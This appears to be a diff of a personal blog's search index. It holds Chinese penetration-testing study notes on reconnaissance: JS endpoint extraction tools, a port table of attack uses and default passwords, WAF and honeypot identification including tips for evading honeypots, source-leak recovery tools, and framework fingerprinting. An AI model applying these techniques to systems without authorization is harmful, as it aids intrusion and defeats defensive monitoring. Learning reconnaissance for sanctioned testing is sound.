-<p>蜜罐项目识别 <a href="https://github.com/360quake/quake_rs">360quake</a>（很好，可以识别，但是需要360网络空间冲积分用key）<br>quake.exe init apikey值<br>quake.exe honeypot 目标<br>网络空间搜索IP，网站可以帮助判断</p>
-<p>蜜罐项目人工识别，设备指纹分析，判断蜜罐<br>识别的端口很多而有规律性，可能是蜜罐</p>
-<p>Web访问协议就下载，正常真实系统不会出现这种情况，蜜罐会记录攻击者的账号密码，但是账号密码会采用web功能jsonp传输给蜜罐（蜜罐是不用使用mysql这种数据库的），如果访问端口，就会下载这个文件，一看就是蜜罐了</p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
+      <tags>
+        <tag>项目集合</tag>
+      </tags>
   </entry>
   <entry>
     <title>Web应用&amp;企业产权&amp;指纹识别&amp;域名资产&amp;网络空间&amp;威胁情报</title>
@@ -867,6 +333,402 @@
       </categories>
   </entry>
   <entry>
+    <title>Markdown语法</title>
+    <url>/2024/03/11/Markdown%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="Markdown-官方教程"><a href="#Markdown-官方教程" class="headerlink" title="Markdown 官方教程"></a><a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown 官方教程</a></h2><table>
+<thead>
+<tr>
+<th>元素</th>
+<th>Markdown 语法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>标题（Heading）</td>
+<td><code># H1</code><br><code>## H2</code><br><code>### H3</code></td>
+</tr>
+<tr>
+<td>粗体（Bold）</td>
+<td><code>**bold text**</code></td>
+</tr>
+<tr>
+<td>斜体（Italic）</td>
+<td><code>*italicized text*</code></td>
+</tr>
+<tr>
+<td>引用块（Blockquote）</td>
+<td><code>&gt; blockquote</code></td>
+</tr>
+<tr>
+<td>有序列表（Ordered List）</td>
+<td><code>1. First item</code><br><code>2. Second item</code><br><code>3. Third item</code></td>
+</tr>
+<tr>
+<td>无序列表（Unordered List）</td>
+<td><code>- First item</code><br><code>- Second item</code><br><code>- Third item</code></td>
+</tr>
+<tr>
+<td>代码（Code）</td>
+<td><code>`code`</code></td>
+</tr>
+<tr>
+<td>分隔线（Horizontal Rule）</td>
+<td><code>---</code></td>
+</tr>
+<tr>
+<td>链接（Link）</td>
+<td><code>[title](https://www.example.com)</code></td>
+</tr>
+<tr>
+<td>图片（Image）</td>
+<td><code>![alt text](image.jpg)</code></td>
+</tr>
+<tr>
+<td>代码块（Fenced Code Block）</td>
+<td><code>```bash</code><br><code>&#123;</code><br><code>  &quot;firstName&quot;: &quot;John&quot;,</code><br><code>  &quot;lastName&quot;: &quot;Smith&quot;,</code><br><code>  &quot;age&quot;: 25</code><br><code>&#125;</code><br><code>```</code></td>
+</tr>
+<tr>
+<td>脚注（Footnote）</td>
+<td><code>Here&#39;s a sentence with a footnote. [^1]</code><br><code>[^1]: This is the footnote.</code></td>
+</tr>
+<tr>
+<td>标题编号（Heading ID）</td>
+<td><code>### My Great Heading &#123;#custom-id&#125;</code></td>
+</tr>
+<tr>
+<td>定义列表（Definition List）</td>
+<td><code>term</code><br><code>: definition</code></td>
+</tr>
+<tr>
+<td>删除线（Strikethrough）</td>
+<td><code>~~The world is flat.~~</code></td>
+</tr>
+<tr>
+<td>任务列表（Task List）</td>
+<td><code>- [x] Write the press release</code><br><code>- [ ] Update the website</code><br><code>- [ ] Contact the media</code></td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B914/</url>
+    <content><![CDATA[<h2 id="什么是JS渗透测试？"><a href="#什么是JS渗透测试？" class="headerlink" title="什么是JS渗透测试？"></a>什么是JS渗透测试？</h2><p>在JavaScript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞<br>JS开发的Web应用和PHP，Java，NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在分析JS代码逻辑（加密算法，APIKey配置，验证逻辑等）进行后期安全测试。</p>
+<p>前提：Web应用可以采用前端或后端语言开发<br>后端语言：PHP Java Python .NET 浏览器端看不到真实的源代码<br>前端语言：JavaScript(JS)和JS框架 浏览器端能看到真实的源代码</p>
+<p>例子：<br>Zblog：核心功能采用PHP语言去写的，例如登录密码加密<br>Vue.js：核心功能采用框架语法JS写的，例如登录密码加密，验证码<br><br></p>
+<h2 id="JS安全问题"><a href="#JS安全问题" class="headerlink" title="JS安全问题"></a>JS安全问题</h2><p>源码泄漏<br>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径，从而进入未授权访问<br>敏感Key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）<br>API接口安全&#x3D;（代码中加密提交，参数传递，更多的URL路径）</p>
+<p>如何从表现中的JS提取价值信息<br>如何从地址中，Fuzz工具来提取未知的JS文件<br>如何从JS开放框架WebPack进行测试<br><br></p>
+<h2 id="流行的JS框架有那些？"><a href="#流行的JS框架有那些？" class="headerlink" title="流行的JS框架有那些？"></a>流行的JS框架有那些？</h2><p>Vue.js, Node.js, jQuery, Angular等<br><br></p>
+<h2 id="如何判定JS开发应用？"><a href="#如何判定JS开发应用？" class="headerlink" title="如何判定JS开发应用？"></a>如何判定JS开发应用？</h2><p>插件Wappalyzer<br>源程序代码简短<br>引入多个JS文件<br>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的JS文件<br>一般cookie中有connect.sid<br><br></p>
+<h2 id="如何获取更多的JS文件？"><a href="#如何获取更多的JS文件？" class="headerlink" title="如何获取更多的JS文件？"></a>如何获取更多的JS文件？</h2><p>手工-浏览器搜索<br>半自动-Burpsuite插件<br>工具化-各类提取&amp;Fuzz项目<br><br></p>
+<h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>打开检查，网站全局搜索分析<br>全局搜索，找连接地址和路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">src=</span><br><span class="line">path=</span><br><span class="line">method:<span class="string">&quot;get&quot;</span></span><br><span class="line">http.get(<span class="string">&quot;)</span></span><br><span class="line"><span class="string">method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string">http.post(&quot;</span>)</span><br><span class="line">.ajax</span><br><span class="line">http://service.httppost</span><br><span class="line">http://service.httpget</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><p>插件一：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。</p>
+<p>插件二：<a href="https://github.com/gh0stkey/HaE">HaE</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。<br><br></p>
+<h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><p>1.用的最多，功能最差的：<a href="https://github.com/Threezh1/JSFinder">JSFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用作快速在网站的JS文件中提取URL，子域名的工具，然后挑选测试，进入，看看能不能未授权访问</p>
+<p>2.Jsfinder的升级版：<a href="https://github.com/pingc0y/URLFinder">URLFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。</p>
+<p>3.<a href="https://github.com/p1g3/JSINFO-SCAN">JSINFO-SCAN</a>-从表现中JS中提取URL或者敏感数据<br>递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具</p>
+<p>4.很好用的浏览器插件：<a href="https://github.com/momosecurity/FindSomething">FindSomething</a><br>从表现中JS中提取URL或者敏感数据<br>该工具是用于快速在网页的html源码或JS代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的URL，请求的IP和域名，泄漏的证件号、手机号、邮箱等信息。</p>
+<p>5.<a href="https://github.com/ffuf/ffuf">Ffuf</a>-爆破找到更多的JS文件分析更多的信息<br>各种字典：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a><br>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p>
+<p>6.<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>-针对JS框架开发打包器Webpack检测，在浏览器插件杂项里面有webpack就能使用这个工具了<br>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具，然后就能生成报告</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B915/</url>
+    <content><![CDATA[<h2 id="端口判断服务"><a href="#端口判断服务" class="headerlink" title="端口判断服务"></a>端口判断服务</h2><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>渗透用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tcp 20,21</td>
+<td>FTP</td>
+<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
+</tr>
+<tr>
+<td>tcp 22</td>
+<td>SSH</td>
+<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
+</tr>
+<tr>
+<td>tcp 23</td>
+<td>Telnet</td>
+<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
+</tr>
+<tr>
+<td>tcp 25</td>
+<td>SMTP</td>
+<td>邮件伪造,vrfy&#x2F;expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+</tr>
+<tr>
+<td>tcp&#x2F;udp 53</td>
+<td>DNS</td>
+<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
+</tr>
+<tr>
+<td>tcp&#x2F;udp 69</td>
+<td>TFTP</td>
+<td>尝试下载目标及其的各类重要配置文件</td>
+</tr>
+<tr>
+<td>tcp 80-89,443,8440-8450,8080-8089</td>
+<td>各种常用的Web服务端口</td>
+<td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td>
+</tr>
+<tr>
+<td>tcp 110</td>
+<td>POP3</td>
+<td>可尝试爆破,嗅探</td>
+</tr>
+<tr>
+<td>tcp 111,2049</td>
+<td>NFS</td>
+<td>权限配置不当</td>
+</tr>
+<tr>
+<td>tcp 137,139,445</td>
+<td>Samba</td>
+<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
+</tr>
+<tr>
+<td>tcp 143</td>
+<td>IMAP</td>
+<td>可尝试爆破</td>
+</tr>
+<tr>
+<td>udp 161</td>
+<td>SNMP</td>
+<td>爆破默认团队字符串,搜集目标内网信息</td>
+</tr>
+<tr>
+<td>tcp 389</td>
+<td>LDAP</td>
+<td>ldap注入,允许匿名访问,弱口令</td>
+</tr>
+<tr>
+<td>tcp 512,513,514</td>
+<td>Linux rexec</td>
+<td>可爆破,rlogin登陆</td>
+</tr>
+<tr>
+<td>tcp 873</td>
+<td>Rsync</td>
+<td>匿名访问,文件上传</td>
+</tr>
+<tr>
+<td>tcp 1194</td>
+<td>OpenVPN</td>
+<td>想办法钓VPN账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 1352</td>
+<td>Lotus</td>
+<td>弱口令,信息泄漏,爆破</td>
+</tr>
+<tr>
+<td>tcp 1433</td>
+<td>SQL Server</td>
+<td>注入,提权,sa弱口令,爆破</td>
+</tr>
+<tr>
+<td>tcp 1521</td>
+<td>Oracle</td>
+<td>tns爆破,注入,弹shell…</td>
+</tr>
+<tr>
+<td>tcp 1500</td>
+<td>ISPmanager</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 1723</td>
+<td>PPTP</td>
+<td>爆破,想办法钓VPN账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 2082,2083</td>
+<td>cPanel</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 2181</td>
+<td>ZooKeeper</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 2601,2604</td>
+<td>Zebra</td>
+<td>默认密码zerbra</td>
+</tr>
+<tr>
+<td>tcp 3128</td>
+<td>Squid</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3312,3311</td>
+<td>kangle</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3306</td>
+<td>MySQL</td>
+<td>注入,提权,爆破</td>
+</tr>
+<tr>
+<td>tcp 3389</td>
+<td>Windows rdp</td>
+<td>shift后门,需要03以下的系统,爆破,ms12-020</td>
+</tr>
+<tr>
+<td>tcp 3690</td>
+<td>SVN</td>
+<td>svn泄露,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 4848</td>
+<td>GlassFish</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 5000</td>
+<td>Sybase&#x2F;DB2</td>
+<td>爆破,注入</td>
+</tr>
+<tr>
+<td>tcp 5432</td>
+<td>PostgreSQL</td>
+<td>爆破,注入,弱口令</td>
+</tr>
+<tr>
+<td>tcp 5900,5901,5902</td>
+<td>VNC</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 5984</td>
+<td>CouchDB</td>
+<td>未授权导致的任意指令执行</td>
+</tr>
+<tr>
+<td>tcp 6379</td>
+<td>Redis</td>
+<td>可尝试未授权访问,弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 7001,7002</td>
+<td>WebLogic</td>
+<td>Java反序列化,弱口令</td>
+</tr>
+<tr>
+<td>tcp 7778</td>
+<td>Kloxo</td>
+<td>主机面板登录</td>
+</tr>
+<tr>
+<td>tcp 8000</td>
+<td>Ajenti</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8009</td>
+<td>tomcat Ajp</td>
+<td>Tomcat-Ajp协议漏洞</td>
+</tr>
+<tr>
+<td>tcp 8443</td>
+<td>Plesk</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8069</td>
+<td>Zabbix</td>
+<td>远程执行,SQL注入</td>
+</tr>
+<tr>
+<td>tcp 8080-8089</td>
+<td>Jenkins,JBoss</td>
+<td>反序列化,控制台弱口令</td>
+</tr>
+<tr>
+<td>tcp 9080-9081,9090</td>
+<td>WebSphere</td>
+<td>Java反序列化&#x2F;弱口令</td>
+</tr>
+<tr>
+<td>tcp 9200,9300</td>
+<td>ElasticSearch</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>tcp 11211</td>
+<td>Memcached</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 27017,27018</td>
+<td>MongoDB</td>
+<td>爆破,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 50070,50030</td>
+<td>Hadoop</td>
+<td>默认端口未授权访问</td>
+</tr>
+</tbody></table>
+<br>
+
+<p>开放的端口可以判断安装应用服务器，的是什么数据库等等，应对安全问题<br><br></p>
+<h2 id="Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术"><a href="#Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术" class="headerlink" title="Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术"></a>Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术</h2><p>可以用作Web，应用中间件，数据库类，其他服务协议探针</p>
+<ol>
+<li><p>端口扫描工具：<a href="https://nmap.org/download.html">Nmap</a>，<a href="https://github.com/robertdavidgraham/masscan">MASSCAN</a>，网络空间 (<a href="https://quake.360.net/quake/#/index">360</a>，<a href="https://fofa.info/">fofa</a>，<a href="https://hunter.qianxin.com/">奇安信</a>等)<br>使用参考：<br><a href="https://www.cnblogs.com/lzy575566/p/15513726.html">编译MASSCAN</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125266331">MASSCAN核心使用</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125263917">Nmap核心使用方法</a></p>
+</li>
+<li><p>端口开放状态：Close Open Filtered<br>close就是关闭了，别想了<br>open就是开了<br>filtered就是被过滤了，有可能开了，有可能关闭了，因为防火墙的原因</p>
+</li>
+<li><p>需要考虑情况：防火墙，内网环境<br>防火墙可能出现情况：防火墙阻止判断，端口明明开放，却无法通讯<br>内网环境可能出现情况：明明Web的80或者8080端口，数据库端口开的，网站也能正常打开，但是你对目标进行端口扫描，发现端口没有开放（排除防火墙问题），因为去扫，扫的是外网，没有用，需要扫其中的内网，没办法解决，只能说会出现这种状况</p>
+<br></li>
+</ol>
+<h2 id="WAF防火墙-看图-项目-指纹"><a href="#WAF防火墙-看图-项目-指纹" class="headerlink" title="WAF防火墙-看图&amp;项目&amp;指纹"></a>WAF防火墙-看图&amp;项目&amp;指纹</h2><p>工具链接: <a href="https://github.com/EnableSecurity/wafw00f">WAFW00F</a>，<a href="https://github.com/stamparm/identYwaf">identYwaf</a></p>
+<ol>
+<li><p>WAF解释：<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。大部分的WAF都是绕过不了的，能绕过的都是鸡肋的。看见WAF可以直接跑路了，除非是宝塔，安全狗这些可以试试。</p>
+</li>
+<li><p>WAF分类：<br>云WAF：百度安全宝，阿里云盾，华为云，亚马逊云，长亭雷池等（根据产品等级，对象个数来收费，针对中大型企业，色色公司，技术最先进的，时刻升级，时刻保障）<br>硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品（政府，军工单位相关，技术也比较强）<br>软件WAF：宝塔，安全狗、D盾等（小中型公司，没经济实力的个人公司）<br>代码级WAF：自己写的代码过滤规则，防止出现注入等，一般是在代码里面写死的</p>
+</li>
+<li><p>识别看图：<br>拦截页面，identYwaf项目内置</p>
+</li>
+<li><p>识别项目：<br>网络空间识别</p>
+<br></li>
+</ol>
+<h2 id="蜜罐平台-人工-网络空间-项目"><a href="#蜜罐平台-人工-网络空间-项目" class="headerlink" title="蜜罐平台-人工&amp;网络空间&amp;项目"></a>蜜罐平台-人工&amp;网络空间&amp;项目</h2><ol>
+<li><p>蜜罐解释：<br>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p>
+</li>
+<li><p>蜜罐分类：<br>根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类：低交互蜜罐.中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如：数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等。</p>
+</li>
+<li><p>识别原理，技术：<br><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg</a></p>
+</li>
+</ol>
+<p><a href="https://hfish.net/#/">hfish</a> 搭建蜜罐，这个搭建的大部分可以绕过网络空间的判断蜜罐</p>
+<p>蜜罐项目识别 <a href="https://github.com/360quake/quake_rs">360quake</a>（很好，可以识别，但是需要360网络空间冲积分用key）<br>quake.exe init apikey值<br>quake.exe honeypot 目标<br>网络空间搜索IP，网站可以帮助判断</p>
+<p>蜜罐项目人工识别，设备指纹分析，判断蜜罐<br>识别的端口很多而有规律性，可能是蜜罐</p>
+<p>Web访问协议就下载，正常真实系统不会出现这种情况，蜜罐会记录攻击者的账号密码，但是账号密码会采用web功能jsonp传输给蜜罐（蜜罐是不用使用mysql这种数据库的），如果访问端口，就会下载这个文件，一看就是蜜罐了</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CDN绕过&amp;业务部署&amp;漏洞回链&amp;接口探针&amp;全网扫描&amp;反向邮件</title>
     <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B916/</url>
     <content><![CDATA[<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>1.传统访问：用户访问域名 -&gt; 真实服务器IP -&gt; 访问目标主机<br>2.普通CDN：用户访问域名 -&gt; CDN节点 -&gt; 真实服务器IP -&gt; 访问目标主机<br>3.带WAF的CDN：用户访问域名 -&gt; CDN节点（WAF） -&gt; 真实服务器IP -&gt; 访问目标主机</p>
@@ -920,54 +782,138 @@
       </categories>
   </entry>
   <entry>
-    <title>语言框架&amp;开发组件&amp;FastJson&amp;Shiro&amp;Log4j&amp;SpringBoot等</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B917/</url>
-    <content><![CDATA[<h2 id="重点知识-框架-Web-前端-后端"><a href="#重点知识-框架-Web-前端-后端" class="headerlink" title="重点知识-框架&amp;Web&amp;前端&amp;后端"></a>重点知识-框架&amp;Web&amp;前端&amp;后端</h2><p>框架：<br>简单代码的一个整合库，如果使用框架就只需要学习使用如何调用框架即可<br>例如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用就可以了<br>影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制<br>组件：第三方的功能模块（日志记录，数据监控，数据转换等）</p>
-<p>Web架构：</p>
-<ol>
-<li>最简单最入门的开发模型（功能代码全部手写）<br>最容易出现漏洞，因为程序员水平不一，没有第三方或团队的检查代码，单纯的自己写</li>
-<li>结合开发框架的开发模型（以框架为核心实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li>
-<li>结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）</li>
+    <title>Web应用&amp;源码泄漏&amp;开源闭源&amp;指纹识别&amp;GIT&amp;SVN&amp;DS&amp;备份</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B913/</url>
+    <content><![CDATA[<h2 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h2><table>
+<thead>
+<tr>
+<th>标签</th>
+<th>名称</th>
+<th>地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>优选指纹识别</td>
+<td>TideFinger潮汐</td>
+<td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td>
+</tr>
+<tr>
+<td>优选指纹识别</td>
+<td>云悉指纹</td>
+<td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>在线cms指纹识别</td>
+<td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>Wappalyzer</td>
+<td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>WhatWeb</td>
+<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
+</tr>
+<tr>
+<td>指纹识别</td>
+<td>数字观星Finger-P</td>
+<td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td>
+</tr>
+</tbody></table>
+<br>
+通过指纹识别，CMS识别项目，下载到源码之后，通过访问网站目录验证确定是否符合该源码
+<br>
+<br>
+
+
+<h2 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端-闭源-配置不当-源码泄漏"></a>后端-闭源-配置不当-源码泄漏</h2><p>备份：敏感目录文件扫描，管理员习惯备份源代码备份到网站目录，可以扫到并下载</p>
+<p>CVS：<br><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<p>GIT：<br>如果发布了，没有删除.git文件，就能使用<a href="https://github.com/lijiejie/GitHack">Githack</a>恢复文件到敏感信息</p>
+<p>SVN：<br>和git原理是一致的，没有删除.Svn文件，就能使用<a href="https://github.com/callmefeifei/SvnHack">Svnhack</a>恢复文件获取到敏感信息</p>
+<p>DS_Store：<br>针对Mac电脑，目录结构进行存储，<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>不能直接得到源码，得到的是目录架构</p>
+<p>Composer.json：<br>开发的自带文件，利用json文件查看调用的信息，针对php的</p>
+<p><a href="https://www.secpulse.com/archives/124398.html">常见的Web源码泄漏漏洞及其利用</a><br><br></p>
+<h2 id="源码泄漏原因："><a href="#源码泄漏原因：" class="headerlink" title="源码泄漏原因："></a>源码泄漏原因：</h2><ol>
+<li>源码本身的特性入口</li>
+<li>管理员不好的习惯入口</li>
+<li>管理员不好的配置入口</li>
+<li>管理员不好的意识入口</li>
+<li>管理员资源信息搜集入口<br></li>
 </ol>
-<p>前端<br>JS 框架：爬取更多的JS从里面筛选URL或敏感泄漏Key等，也是可以通过对JS代码逻辑进行代码审计<br>组件：Java居多，常见报过有安全漏洞组件（shiro solr log4j sprintboot等）<br>框架：PHP Java Python都有</p>
-<p>后端<br>CMS识别：一般PHP开发居多源码程序（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计）<br><br></p>
-<h2 id="指纹识别-本地工具-gotoScan（CMSEEK）"><a href="#指纹识别-本地工具-gotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-gotoScan（CMSEEK）"></a>指纹识别-本地工具-gotoScan（CMSEEK）</h2><ol>
-<li><a href="https://github.com/newbe3three/gotoscan">gotoscan</a>，本地工具适用于内网和外网环境</li>
-<li>网络空间：Fofa Quake Hunter</li>
-<li>网络空间：IO图标关系<br></li>
-</ol>
-<h2 id="Python-开发框架-Django-Flask"><a href="#Python-开发框架-Django-Flask" class="headerlink" title="Python-开发框架-Django&amp;Flask"></a>Python-开发框架-Django&amp;Flask</h2><p>Django</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有： Set-Cookie:csrftoken&#x3D; （有的会隐藏，常规有的。不能通过唯一来判断）</li>
-</ol>
-<p>Flask</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：Etag:flask（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
-</ol>
-<h2 id="PHP-开发框架-ThinkPHP-Laravel-Yii"><a href="#PHP-开发框架-ThinkPHP-Laravel-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><p>ThinkPHP：</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：X-Powered-By: ThinkPHP（有的会隐藏，常规有的。不能通过这唯一来判断）</li>
-<li>CMS识别到源码体系TP开发</li>
-</ol>
-<p>Laravel：</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：Set-Cookie：Laravel_sesssion&#x3D;（有的会隐藏，常规有的。不能通过唯一来判断）</li>
-</ol>
-<p>Yii:</p>
-<ol>
-<li>浏览器识别插件</li>
-<li>数据包里有：Set-Cookie：Yii_sesssion&#x3D;（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
-</ol>
-<h2 id="Java-框架组件-Fastjson-Shiro-Solr-Spring"><a href="#Java-框架组件-Fastjson-Shiro-Solr-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a></p>
-<p>Fastjson&#x2F;Jackson:<br>在提交JSON数据包中修改测试：<br>Fastjson组件会把01解析成1<br>Jackson组件在解析01时会抛出异常<br><a href="https://forum.butian.net/share/1679">https://forum.butian.net/share/1679</a><br><a href="https://www.iculture.cc/forum-post/24115.html">https://www.iculture.cc/forum-post/24115.html</a></p>
-<p>Shiro:<br>请求包的cookie中存在rememberMe字段<br>返回包中存在set-Cookie：remeberMe&#x3D;deleteMe<br>请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe<br>有时候服务器不会主动返回remeberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为remember Me&#x3D;1，若相应包有rememberMe&#x3D;deleteMe，则基本可以确定网站apache shiro搭建的。</p>
-<p>Struts2:<br>一般使用struts2框架的网页地址后缀带do或action，可以尝试进行利用</p>
-<p>Springboot:<br>1.通过web应用程序网页标签的小绿叶图标<br>2.通过springboot框架默认报错页面</p>
-<p>Solr：<br>一般开放8983端口,访问页面也可以探针到</p>
